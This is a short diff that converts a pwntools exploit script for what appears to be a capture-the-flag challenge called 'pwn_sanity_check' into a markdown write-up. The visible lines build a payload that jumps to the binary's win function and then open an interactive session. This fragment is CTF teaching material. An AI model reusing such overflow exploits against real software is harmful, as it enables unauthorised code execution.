@@ -1,5 +1,6 @@
-#!/usr/bin/env python3
+# ***PWN_SANITY_CHECK***
 
+```
 from pwn import *
 
 binary = context.binary = ELF('./pwn_sanity_check')
@@ -23,4 +24,4 @@ payload += p64(binary.sym.win)
 
 p.sendlineafter('joke\n',payload)
 p.interactive()
-
+```
